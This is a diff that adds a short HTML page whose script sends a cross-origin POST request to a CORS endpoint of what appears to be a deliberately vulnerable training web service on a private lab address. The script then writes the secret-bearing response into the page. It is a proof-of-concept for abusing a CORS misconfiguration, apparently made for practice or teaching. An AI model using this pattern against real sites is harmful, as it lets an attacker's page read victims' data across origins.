@@ -1,0 +1,22 @@
+<html>
+<script>
+function submit_request()
+{
+  xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("POST","http://192.168.56.11/dvwebservices/vulnerabilities/cors/server.php", true);
+
+  xmlhttp.onreadystatechange=function() 
+  {
+
+   if(xmlhttp.readyState==4 && xmlhttp.status == 200 )
+    {
+      document.write(xmlhttp.responseText);
+    }
+  }
+  xmlhttp.send('{"searchterm":"secretword:one"}');
+}
+</script>
+<body>
+<input type="button" onclick="submit_request()" value="Submit request">
+</body>
+</html>
